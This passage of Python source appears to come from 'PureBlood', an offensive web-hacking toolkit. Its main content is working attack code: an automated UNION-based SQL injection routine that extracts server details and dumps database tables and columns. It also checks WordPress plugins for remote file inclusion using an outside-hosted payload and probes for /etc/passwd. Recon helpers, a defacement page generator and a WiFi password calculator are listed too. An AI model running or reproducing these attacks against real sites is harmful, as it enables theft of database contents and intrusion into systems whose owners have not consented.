',' + sqli_payload_basedir + ',')\n            auto_sql_injection_request_user_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_user + ',')\n            auto_sql_injection_request_database_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_database + ',')\n            auto_sql_injection_request_schema_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_schema + ',')\n            auto_sql_injection_request_uuid_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_uuid + ',')\n            auto_sql_injection_request_system_user_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_system_user + ',')\n            auto_sql_injection_request_session_user_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_session_user + ',')\n            auto_sql_injection_request_symlink_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_symlink + ',')\n            auto_sql_injection_request_ssl_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_ssl + ',')\n            auto_sql_injection_request_hostname = requests.get(auto_sql_injection_request_hostname_url)\n            auto_sql_injection_request_tmpdir = requests.get(auto_sql_injection_request_tmpdir_url)\n            auto_sql_injection_request_datadir = requests.get(auto_sql_injection_request_datadir_url)\n            auto_sql_injection_request_version = requests.get(auto_sql_injection_request_version_url)\n            auto_sql_injection_request_basedir = requests.get(auto_sql_injection_request_basedir_url)\n            auto_sql_injection_request_user = requests.get(auto_sql_injection_request_user_url)\n            auto_sql_injection_request_database = requests.get(auto_sql_injection_request_database_url)\n            auto_sql_injection_request_schema = requests.get(auto_sql_injection_request_schema_url)\n            auto_sql_injection_request_uuid = requests.get(auto_sql_injection_request_uuid_url)\n            auto_sql_injection_request_system_user = requests.get(auto_sql_injection_request_system_user_url)\n            auto_sql_injection_request_session_user = requests.get(auto_sql_injection_request_session_user_url)\n            auto_sql_injection_request_symlink = requests.get(auto_sql_injection_request_symlink_url)\n            auto_sql_injection_request_ssl = requests.get(auto_sql_injection_request_ssl_url)\n            sqli_hostname_soup = BeautifulSoup(auto_sql_injection_request_hostname.text, 'html.parser')\n            sqli_tmpdir_soup = BeautifulSoup(auto_sql_injection_request_tmpdir.text, 'html.parser')\n            sqli_datadir_soup = BeautifulSoup(auto_sql_injection_request_datadir.text, 'html.parser')\n            sqli_version_soup = BeautifulSoup(auto_sql_injection_request_version.text, 'html.parser')\n            sqli_basedir_soup = BeautifulSoup(auto_sql_injection_request_basedir.text, 'html.parser')\n            sqli_user_soup = BeautifulSoup(auto_sql_injection_request_user.text, 'html.parser')\n            sqli_database_soup = BeautifulSoup(auto_sql_injection_request_database.text, 'html.parser')\n            sqli_schema_soup = BeautifulSoup(auto_sql_injection_request_schema.text, 'html.parser')\n            sqli_uuid_soup = BeautifulSoup(auto_sql_injection_request_uuid.text, 'html.parser')\n            sqli_system_user_soup = BeautifulSoup(auto_sql_injection_request_system_user.text, 'html.parser')\n            sqli_session_user_soup = BeautifulSoup(auto_sql_injection_request_session_user.text, 'html.parser')\n            sqli_symlink_soup = BeautifulSoup(auto_sql_injection_request_symlink.text, 'html.parser')\n            sqli_ssl_soup = BeautifulSoup(auto_sql_injection_request_ssl.text, 'html.parser')\n            sqli_hostname = sqli_hostname_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_tmpdir = sqli_tmpdir_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_datadir = sqli_datadir_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_version = sqli_version_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_basedir = sqli_basedir_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_user = sqli_user_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_database = sqli_database_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_schema = sqli_schema_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_uuid = sqli_uuid_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_system_user = sqli_system_user_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_session_user = sqli_session_user_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_symlink = sqli_symlink_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            sqli_ssl = sqli_ssl_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text\n            print ('[+] Hostname: {0}'.format(sqli_hostname))\n            print ('[+] TMP Directory: {0}'.format(sqli_tmpdir))\n            print ('[+] Data Directory: {0}'.format(sqli_datadir))\n            print ('[+] Database Version: {0}'.format(sqli_version))\n            print ('[+] Base Directory: {0}'.format(sqli_basedir))\n            print ('[+] Current User: {0}'.format(sqli_user))\n            print ('[+] Current Database: {0}'.format(sqli_database))\n            print ('[+] Current Schema: {0}'.format(sqli_schema))\n            print ('[+] System UUID Key: {0}'.format(sqli_uuid))\n            print ('[+] Current System User: {0}'.format(sqli_system_user))\n            print ('[+] Session User: {0}'.format(sqli_session_user))\n            print ('[+] Is Sysmlink Enabled?: {0}'.format(sqli_symlink))\n            print ('[+] Is SSL Enabled?: {0}'.format(sqli_ssl))\n            print ('')\n            print ('[~] Dumping Database:')\n            auto_sql_injection_request_dios_soup_pureblood_list = []\n            auto_sql_injection_request_dios_soup_pureblood = auto_sql_injection_request_dios_soup.findAll('strong', attrs={'id': 'PureBlood'})\n            for i in auto_sql_injection_request_dios_soup_pureblood:\n                if i.text in auto_sql_injection_request_dios_soup_pureblood_list:\n                    pass\n                else:\n                    auto_sql_injection_request_dios_soup_pureblood_list.append(i.text)\n            for i in auto_sql_injection_request_dios_soup_pureblood_list:\n                print ('\\t{0}'.format(i))\n            print ('')\n            sqli_table = ''\n            user_choice = ''\n            sqli_column = []\n            print ('{2}[{1}#{2}] {3}- {4}Just enter exit/done if you want to start dumping{0}'.format(reset + bold, green, blue, yellow, cyan))\n            while True:\n                if sys.version_info[0] == 3:\n                    if sqli_table:\n                        pass\n                    elif not sqli_table:\n                        user_choice1 = str(input('Table> '))\n                        sqli_table = user_choice1\n                    user_choice = str(input('\\tColumn> '))\n                    if user_choice == 'done' or user_choice == 'exit' or user_choice == '':\n                        break\n                    else:\n                        sqli_column.append(user_choice)\n                if sys.version_info[0] == 2:\n                    if sqli_table:\n                        pass\n                    elif not sqli_table:\n                        user_choice1 = str(raw_input('Table> '))\n                        sqli_table = user_choice1\n                    user_choice = str(raw_input('\\tColumn> '))\n                    if user_choice == 'done' or user_choice == 'exit' or user_choice == '':\n                        break\n                    else:\n                        sqli_column.append(user_choice)\n            print ('')\n            print ('[~] Dumping Columns:')\n            for i in sqli_column:\n                auto_sql_injection_request_column_dump_list = []\n                auto_sql_injection_request_column_dump_url = '{0}{1} /*!50000Union*/ all select {2} from {3}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii, sqli_table)\n                auto_sql_injection_request_column_dump_url = auto_sql_injection_request_column_dump_url.replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_dump_column_payload + ',')\n                auto_sql_injection_request_column_dump_url = auto_sql_injection_request_column_dump_url.replace('<column>', i)\n                auto_sql_injection_request_column_dump = requests.get(auto_sql_injection_request_column_dump_url)\n                auto_sql_injection_request_column_dump_soup = BeautifulSoup(auto_sql_injection_request_column_dump.text, 'html.parser')\n                auto_sql_injection_request_column_dump_soup_pureblood = auto_sql_injection_request_column_dump_soup.find_all('strong', attrs={'id': 'PureBloodINFO'})\n                for ii in auto_sql_injection_request_column_dump_soup_pureblood:\n                    if ii.text in auto_sql_injection_request_column_dump_list:\n                        pass\n                    elif ii.text not in auto_sql_injection_request_column_dump_list:\n                        auto_sql_injection_request_column_dump_list.append(ii.text)\n                for iii in auto_sql_injection_request_column_dump_list:\n                    print ('\\t{0} -> {1}'.format(i, iii))\n\n    def wordpress_vulnerability_check(self, wvc_url):\n        print ('[#] - Checking (WordPress Woocommerce - Directory Craversal):')\n        wp_woocommerce_wvc_url = ''\n        wp_woocommerce = requests.get(wvc_url + '/wp-content/plugins/woocommerce/templates/emails/plain')\n        wp_woocommerce_wvc_url = wvc_url + '/wp-content/plugins/woocommerce/templates/emails/plain'\n        if wp_woocommerce.status_code == 200:\n            print ('\\t[+] - Vulnerable! ~ ' + wp_woocommerce_wvc_url)\n        elif wp_woocommerce.status_code == 301:\n            print ('\\t[!] - Redirected! ~ ' + wp_woocommerce_wvc_url)\n        elif wp_woocommerce.status_code == 403:\n            print ('\\t[!] - Forbidden! ~ ' + wp_woocommerce_wvc_url)\n        else:\n            print ('\\t[!] - 404 Found! ~ ' + wp_woocommerce_wvc_url)\n        print ('\\n\\n[#] - Checking (Wordpress Plugin Booking Calendar 3.0.0 - SQL Injection / Cross-Site Scripting):')\n        wp_plugin_booking_calendar_wvc_url = ''\n        wp_plugin_booking_calendar = requests.get(wvc_url + '/BOOKING_WP/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php')\n        if wp_plugin_booking_calendar.status_code == 200:\n            wp_plugin_booking_calendar = wp_plugin_booking_calendar\n            wp_plugin_booking_calendar_wvc_url = wvc_url + '/BOOKING_WP/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php'\n        elif wp_plugin_booking_calendar.status_code == 404:\n            wp_plugin_booking_calendar = requests.get(wvc_url + '/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php')\n            if wp_plugin_booking_calendar.status_code == 200:\n                wp_plugin_booking_calendar = wp_plugin_booking_calendar\n                wp_plugin_booking_calendar_wvc_url = wvc_url + '/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php'\n            else:\n                wp_plugin_booking_calendar_wvc_url = wvc_url + '/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php'\n                wp_plugin_booking_calendar = 'Not Found'\n        if wp_plugin_booking_calendar == 'Not Found':\n            wp_plugin_booking_calendar_wvc_url = wvc_url + '/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php'\n            print ('\\t[!] - 404 Found! ~ ' + wp_plugin_booking_calendar_wvc_url)\n        else:\n            print ('\\t[+] - XSS Maybe Vulnerable! ~ ' + wp_plugin_booking_calendar_wvc_url + '?month=<XSS Payload>')\n            print ('\\t[+] - SQLMap Maybe Vulnerable! ~ ' + wp_plugin_booking_calendar_wvc_url + '?month=')\n            print ('\\t[+] - Unfortunately I can\\'t handle alerts without using Selenium and you should manually use SQLMap. Try to do it manually')\n        print ('\\n\\n[#] - Checking (WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion):')\n        wp_plugin_wp_spritz_wvc_url = ''\n        wp_plugin_wp_spritz = requests.get(wvc_url + '/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php')\n        if wp_plugin_wp_spritz.status_code == 200:\n            wp_plugin_wp_spritz = requests.get(wvc_url + '/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?wvc_url=https://raw.githubusercontent.com/cr4shcod3/pureblood/master/l33t/rfi.txt')\n            wp_plugin_wp_spritz_wvc_url = wvc_url + '/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?wvc_url=https://raw.githubusercontent.com/cr4shcod3/pureblood/master/l33t/rfi.txt'\n            if 'PureBlood RFI ~Cr4sHCoD3' in wp_plugin_wp_spritz.text:\n                print ('\\t[+] - Vulnerable! ~ ' + wp_plugin_wp_spritz_wvc_url)\n                wp_plugin_wp_spritz = requests.get(wvc_url + '/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?wvc_url=/etc/passwd')\n                if wp_plugin_wp_spritz.status_code == 403 or wp_plugin_wp_spritz.status_code == 400:\n                    print ('\\t[+] - Try to bypass LFI! ~ ' + wp_woocommerce_wvc_url)\n                elif 'The page you are trying to access is restricted due to a security rule.' in wp_plugin_wp_spritz.text:\n                    print ('\\t[+] - Try to bypass LFI! ~ ' + wp_woocommerce_wvc_url)\n        elif wp_plugin_wp_spritz.status_code == 404:\n            wp_plugin_wp_spritz_wvc_url = wvc_url + '/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php'\n            print ('\\t[!] - 404 Found! ~ ' + wp_plugin_wp_spritz_wvc_url)\n        print ('\\n\\n[#] - Checking (WordPress Plugin Events Calendar - \\'event_id\\' SQL Injection):')\n        wp_plugin_events_calendar_wvc_url = ''\n        wp_plugin_events_calendar = requests.get(wvc_url + '/event.php?event_id=1')\n        if wp_plugin_events_calendar.status_code == 200:\n            wp_plugin_events_calendar_result = ''\n            wp_plugin_events_calendar = requests.get(wvc_url + '/event.php?event_id=1\\'')\n            wp_plugin_events_calendar_wvc_url = wvc_url + '/event.php?event_id=1\\''\n            for db, errors in dbms_errors.items():\n                for error in errors:\n                    if re.compile(error).search(wp_plugin_events_calendar.text):\n                        wp_plugin_events_calendar_result = 'Vulnerable'\n                        print ('\\t[+] - ' + db + ' Vulnerable! ~ ' + wp_plugin_events_calendar_wvc_url)\n            if wp_plugin_events_calendar_result == '':\n                print ('\\t[!] - 404 Found Vulnerable! ~ ' + wp_plugin_events_calendar_wvc_url)\n        elif wp_plugin_events_calendar.status_code == 404:\n            wp_plugin_events_calendar = requests.get(wvc_url + '/view-event.php?event_id=1')\n            if wp_plugin_events_calendar.status_code == 200:\n                wp_plugin_events_calendar_result = ''\n                wp_plugin_events_calendar = requests.get(wvc_url + '/view-event.php?event_id=1\\'')\n                wp_plugin_events_calendar_wvc_url = wvc_url + '/view-event.php?event_id=1\\''\n                for db, errors in dbms_errors.items():\n                    for error in errors:\n                        if re.compile(error).search(wp_plugin_events_calendar.text):\n                            wp_plugin_events_calendar_result = 'Vulnerable'\n                            print ('\\t[+] - ' + db + ' Vulnerable! ~ ' + wp_plugin_events_calendar_wvc_url)\n                if wp_plugin_events_calendar_result == '':\n                    print ('\\t[!] - 404 Found Vulnerable! ~ ' + wp_plugin_events_calendar_wvc_url)\n\n\n\nclass WebPentest:\n    def banner_grab(self, bg_url):\n        banner_grab_request = requests.get(bg_url)\n        banner_grab_result = banner_grab_request.headers\n        banner_grab_result = str(banner_grab_result).replace("{'", "").replace("'}", "").replace("': '", ": ").replace("', '", ",\\n")\n        self.banner_grab_result = banner_grab_result\n        return self.banner_grab_result\n\n    def whois(self, w_url):\n        whois_query = whois.whois(w_url)\n        self.whois_result = whois_query\n        return self.whois_result\n\n    def traceroute(self, t_hostname):\n        traceroute_request = requests.get('https://api.hackertarget.com/mtr/?q=' + t_hostname)\n        traceroute_response = traceroute_request.text\n        traceroute_final = \"\"\"{0}\"\"\".format(str(traceroute_response))\n        self.traceroute_result = traceroute_final\n        return self.traceroute_result\n\n    def dns_record(self, dr_hostname):\n        dns_record_list = []\n        for i in ids:\n            t = threading.Thread(target=dns_record_scanner, args=(dr_hostname, i, dns_record_list, ))\n            t.start()\n        t.join()\n        self.dns_record_result = dns_record_list\n        return self.dns_record_result\n\n    def reverse_dns_lookup(self, rdl_ip):\n        rdl_ip = rdl_ip + '/24'\n        reverse_dns_lookup_request = requests.get('https://api.hackertarget.com/reversedns/?q=' + rdl_ip)\n        reverse_dns_lookup_response = reverse_dns_lookup_request.text\n        reverse_dns_lookup_final = \"\"\"{0}\"\"\".format(str(reverse_dns_lookup_response))\n        self.reverse_ip_lookup_result = reverse_dns_lookup_final\n        return self.reverse_ip_lookup_result\n\n    def zone_transfer_lookup(self, ztl_hostname):\n        zone_transfer_lookup_request = requests.get('https://api.hackertarget.com/zonetransfer/?q=' + ztl_hostname)\n        zone_transfer_lookup_response = zone_transfer_lookup_request.text\n        zone_transfer_lookup_final = \"\"\"{0}\"\"\".format(str(zone_transfer_lookup_response))\n        self.zone_transfer_lookup_result = zone_transfer_lookup_final\n        return self.zone_transfer_lookup_result\n\n    def port_scan(self, ps_hostname, ps_pend): #https://stackoverflow.com/a/38210023\n        port_scan_list = []\n        threads = []\n        output = {}\n        delay = 10\n        for i in range(ps_pend + 1):\n            t = threading.Thread(target=TCP_connect, args=(ps_hostname, i, delay, output))\n            threads.append(t)\n        for i in range(ps_pend + 1):\n            threads[i].start()\n        for i in range(ps_pend + 1):\n            threads[i].join()\n        for i in range(ps_pend + 1):\n            if output[i] == 'Open':\n                port_scan_list.append('[+] Port Open - ' + str(i))\n        self.port_scan_result = port_scan_list\n        return self.port_scan_result\n\n    def admin_panel_scan(self, ads_url):\n        admin_panel_valid = []\n        admin_panel_redirect = []\n        ads_urls = []\n        r_path = []\n        ads_r_urls = []\n        robots = ['/robot.txt', '/robots.txt']\n        for i in admin_panel_list:\n            ads_urls.append(ads_url + i)\n        for i in robots:\n            r_robots = requests.get(ads_url + i)\n            if r_robots.status_code == 200:\n                r_robots = r_robots\n            else:\n                r_robots = ''\n        if r_robots == '':\n            pass\n        else:\n            robots = str(r_robots.text)\n            for i in robots.split("\\n"):\n                if i.startswith('Allow'):\n                    r_path.append(i.split(': ')[1].split(' ')[0])\n                elif i.startswith('Disallow'):\n                    r_path.append(i.split(': ')[1].split(' ')[0])\n            for i in r_path:\n                ads_r_urls.append(ads_url + i)\n        for i in ads_r_urls:\n            ads_r_urls_request = requests.get(i)\n            if 'Admin' in ads_r_urls_request.text or 'Login' in ads_r_urls_request.text:\n                r_admin_panel = i\n                admin_panel_valid.append(i)\n            elif 'admin' in ads_r_urls_request.text or 'login' in ads_r_urls_request.text:\n                r_admin_panel = i\n                admin_panel_valid.append(i)\n            elif 'Username' in ads_r_urls_request.text or 'Password' in ads_r_urls_request.text:\n                r_admin_panel = i\n                admin_panel_valid.append(i)\n            elif 'username' in ads_r_urls_request.text or 'password' in ads_r_urls_request.text:\n                r_admin_panel = i\n                admin_panel_valid.append(i)\n            else:\n                r_admin_panel = None\n        if not admin_panel_valid:\n            for i in ads_urls:\n                admin_scan_request = requests.get(i)\n                if admin_scan_request.status_code == 200:\n                    admin_panel_valid.append(i)\n                    break\n                elif admin_scan_request.status_code == 301 or admin_scan_request.status_code == 302:\n                    admin_panel_redirect.append(i)\n        else:\n            pass\n        admin_panel_valid = list(set(admin_panel_valid))\n        for i in admin_panel_redirect:\n            admin_panel_valid.append(i + ' - 301')\n        if not admin_panel_valid:\n            webbrowser.open_new_tab(google_hacking + 'site:' + ads_url + '+inurl:login | admin | user | cpanel | account | moderator | phpmyadmin | /cp')\n        self.admin_panel_scan_result = admin_panel_valid\n        return self.admin_panel_scan_result\n\n    def subdomain_scan(self, ss_hostname, subdomain_list):\n        so_200 = []\n        so_301 = []\n        so_302 = []\n        so_403 = []\n        ss_urls = []\n        ss_subdomain_list = open(subdomain_list, 'r')\n        ss_subdomain_list = ss_subdomain_list.read().splitlines()\n        for i in ss_subdomain_list:\n            ss_urls.append(i + '.' + ss_hostname)\n        for i in ss_urls:\n            t = threading.Thread(target=subdomain_scanner, args=(i, so_200, so_301, so_302, so_403,))\n            t.start()\n        t.join()\n        self.ss_200_result = so_200\n        self.ss_301_result = so_301\n        self.ss_302_result = so_302\n        self.ss_403_result = so_403\n        return self.ss_200_result, self.ss_301_result, self.ss_302_result, self.ss_403_result\n\n    def cms_detect(self, cd_hostname):\n        cd_cms = []\n        cd_cms_version = []\n        cms_detect_request = requests.get('https://whatcms.org/?s=' + cd_hostname)\n        cd_soup = BeautifulSoup(cms_detect_request.content, 'html.parser')\n        cd_soup_div = cd_soup.find('div', attrs={'class': 'large text-center'})\n        for i in cd_soup_div.find_all('span', attrs={'class': 'nowrap'}):\n            cd_cms_version.append(i.text)\n        cd_cms.append(cd_soup_div.find('a').text)\n        if not cd_cms:\n            cms_detect_final = '[!] - There\\'s no CMS Detected!'\n        else:\n            cd_cms_version = cd_cms_version[1]\n            cms_detect_final = cd_cms[0].replace('/c/', '')\n            cms_detect_final = cms_detect_final + ' - ' + cd_cms_version\n        self.cms_detect_result = cms_detect_final\n        return self.cms_detect_result\n\n    def reverse_ip_lookup(self, ril_hostname):\n        reverse_ip_lookup_request = requests.get('https://api.hackertarget.com/reverseiplookup/?q=' + ril_hostname)\n        reverse_ip_lookup_response = reverse_ip_lookup_request.text\n        reverse_ip_lookup_final = \"\"\"{0}\"\"\".format(str(reverse_ip_lookup_response))\n        self.reverse_ip_lookup_result = reverse_ip_lookup_final\n        return self.reverse_ip_lookup_result\n\n    def subnet_lookup(self, subnet_input):\n        subnet_lookup_request = requests.get('https://api.hackertarget.com/subnetcalc/?q=' + subnet_input)\n        subnet_lookup_response = subnet_lookup_request.text\n        subnet_lookup_final = \"\"\"{0}\"\"\".format(str(subnet_lookup_response))\n        self.subnet_lookup_result = subnet_lookup_final\n        return self.subnet_lookup_result\n\n    def links_extract(self, le_url):\n        links_extract_request = requests.get('https://api.hackertarget.com/pagelinks/?q=' + le_url)\n        links_extract_response = links_extract_request.text\n        links_extract_final = \"\"\"{0}\"\"\".format(str(links_extract_response))\n        self.links_extract_result = links_extract_final\n        return self.links_extract_result\n\n    def directory_fuzz(self, df_url, directory_list):\n        directory_fuzz_final1 = []\n        directory_fuzz_final2 = []\n        directory_fuzz_final3 = []\n        directory_list_open = open(directory_list, 'r')\n        directory_list = directory_list_open.read().splitlines()\n        df_url_list = []\n        ii = 0\n        for i in directory_list:\n            if '/' in directory_list[ii]:\n                df_url_list.append(df_url + i)\n            else:\n                df_url_list.append(df_url + '/' + i)\n            ii = ii + 1\n        for i in df_url_list:\n            print (i)\n            t = threading.Thread(target=directory_scanner, args=(i, directory_fuzz_final1, directory_fuzz_final2, directory_fuzz_final3))\n            t.start()\n        t.join()\n        self.directory_fuzz_result1 = directory_fuzz_final1\n        self.directory_fuzz_result2 = directory_fuzz_final2\n        self.directory_fuzz_result3 = directory_fuzz_final3\n        return self.directory_fuzz_result1, self.directory_fuzz_result2, self.directory_fuzz_result3\\\n\n    def file_fuzz(self, ff_url, file_list):\n        file_fuzz_final1 = []\n        file_fuzz_final2 = []\n        file_fuzz_final3 = []\n        file_list_open = open(file_list, 'r')\n        file_list = file_list_open.read().splitlines()\n        ff_url_list = []\n        for i in file_list:\n            ff_url_list.append(ff_url + '/' + i)\n        for i in ff_url_list:\n            t = threading.Thread(target=file_scanner, args=(i, file_fuzz_final1, file_fuzz_final2, file_fuzz_final3))\n            t.start()\n        t.join()\n        self.file_fuzz_result1 = file_fuzz_final1\n        self.file_fuzz_result2 = file_fuzz_final2\n        self.file_fuzz_result3 = file_fuzz_final3\n        return self.file_fuzz_result1, self.file_fuzz_result2, self.file_fuzz_result3\n\n    def shodan_search(self, query, ss_SHODAN_API_KEY):\n        shodan_api = shodan.Shodan(ss_SHODAN_API_KEY)\n        try:\n            shodan_search_results = shodan_api.search(query)\n            self.shodan_search_result = shodan_search_results\n            return self.shodan_search_result\n        except shodan.APIError as e:\n            print ('[!] - Error: {0}'.format(e))\n            time.sleep(2)\n            web_pentest()\n\n    def shodan_host_lookup(self, shodan_host, shl_SHODAN_API_KEY):\n        shodan_api = shodan.Shodan(shl_SHODAN_API_KEY)\n        try:\n            shodan_host_lookup_results = shodan_api.host(shodan_host)\n            self.shodan_host_lookup_result = shodan_host_lookup_results\n            return self.shodan_host_lookup_result\n        except shodan.APIError as e:\n            print ('[!] - Error: {0}'.format(e))\n            time.sleep(2)\n            web_pentest()\n\n\n\ndef clear():\n    if platform.system() == 'Linux':\n        os.system('clear')\n    elif platform.system() == 'Windows':\n        os.system('cls')\n    elif platform.system() == 'Darwin':\n        os.system('clear')\n    else:\n        os.system('clear')\n\n\n\ndef banner():\n    if sys.version_info[0] == 3:\n        banner = (\"\"\"{1}\n ██▓███   █    ██  ██▀███  ▓█████  ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄\n▓██░  ██▒ ██  ▓██▒▓██ ▒ ██▒▓█   ▀ ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌\n▓██░ ██▓▒▓██  ▒██░▓██ ░▄█ ▒▒███   ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌\n▒██▄█▓▒ ▒▓▓█  ░██░▒██▀▀█▄  ▒▓█  ▄ ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌\n▒██▒ ░  ░▒▒█████▓ ░██▓ ▒██▒░▒████▒░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓\n▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒\n░▒ ░     ░░▒░ ░ ░   ░▒ ░ ▒░ ░ ░  ░▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒\n░░        ░░░ ░ ░   ░░   ░    ░    ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░\n            ░        ░        ░  ░ ░          ░  ░    ░ ░      ░ ░     ░\n                                        ░                            ░\n\n     {2}--={3}[ {0}{5}Author: Cr4sHCoD3                     {3}]{2}=--\n{4}| {2}-- --={3}[ {0}{5}Version: 2                            {3}]{2}=-- -- {4}|\n| {2}-- --={3}[ {0}{5}Website: https://github.com/cr4shcod3 {3}]{2}=-- -- {4}|\n| {2}-- --={3}[ {0}{5}PureHackers ~ Blood Security Hackers  {3}]{2}=-- -- {4}|\n{0}\n\n\n\n\"\"\".format(reset, red, green, blue, yellow, bold))\n    elif sys.version_info[0] == 2:\n        banner = (\"\"\"{1}\n ██▓███   █    ██  ██▀███  ▓█████  ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄\n▓██░  ██▒ ██  ▓██▒▓██ ▒ ██▒▓█   ▀ ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌\n▓██░ ██▓▒▓██  ▒██░▓██ ░▄█ ▒▒███   ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌\n▒██▄█▓▒ ▒▓▓█  ░██░▒██▀▀█▄  ▒▓█  ▄ ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌\n▒██▒ ░  ░▒▒█████▓ ░██▓ ▒██▒░▒████▒░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓\n▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒\n░▒ ░     ░░▒░ ░ ░   ░▒ ░ ▒░ ░ ░  ░▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒\n░░        ░░░ ░ ░   ░░   ░    ░    ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░\n            ░        ░        ░  ░ ░          ░  ░    ░ ░      ░ ░     ░\n                                        ░                            ░\n\n     {2}--={3}[ {0}{5}Author: Cr4sHCoD3                     {3}]{2}=--\n{4}| {2}-- --={3}[ {0}{5}Version: 2                            {3}]{2}=-- -- {4}|\n| {2}-- --={3}[ {0}{5}Website: https://github.com/cr4shcod3 {3}]{2}=-- -- {4}|\n| {2}-- --={3}[ {0}{5}PureHackers ~ Blood Security Hackers  {3}]{2}=-- -- {4}|\n{0}\n\n\n\n\"\"\".format(reset, red, green, blue, yellow, bold)).decode('utf-8')\n    print (banner)\n\n\n\ndef set_target(target, wfunc):\n    global url\n    global hostname\n    global ip\n    if 'http://' in target:\n        url = target\n        hostname = target.replace('http://', '')\n    elif 'https://' in target:\n        url = target\n        hostname = target.replace('https://', '')\n    if '://' not in target:\n        url = 'http://' + target\n        hostname = target\n    if '1' == target[0] or '2' == target[0] or '3' == target[0] or '4' == target[0] or '5' == target[0] or '6' == target[0] or '7' == target[0] or '8' == target[0] or '9' == target[0]:\n        ip = target\n    elif '=' in target:\n        ip = None # This is it for now.\n    else:\n        ip = socket.gethostbyname(hostname)\n    if wfunc == 1:\n        web_pentest()\n    elif wfunc == 2:\n        web_application_attack()\n    else:\n        main()\n\n\n\ndef generator():\n    print (\"\"\"{3}[ {5}Generator {3}]\n\n    {2}01{3}) {5}Deface Page Generator\n    {2}02{3}) {5}Password Generator\n    {2}03{3}) {5}PLDT WiFi Password Calculator\n    {2}04{3}) {5}Text To Hash\n    {2}90{3}) {5}Back To Menu\n    {2}99{3}) {5}Exit\n{0}\"\"\".format(reset, red, green, blue, yellow, cyan))\n    if sys.version_info[0] == 3:\n        try:\n            choice = int(input('{0}PureBlood{1}({3}Generator{1})> {2}'.format(green, blue, cyan, red)))\n        except KeyboardInterrupt:\n            print ('\\n{2}[{1}+{2}] {3}- {1}Exiting!{0}'.format(reset, red, blue, yellow))\n            sys.exit()\n        except ValueError:\n            print ('\\n{2}[{1}+{2}] {3}- 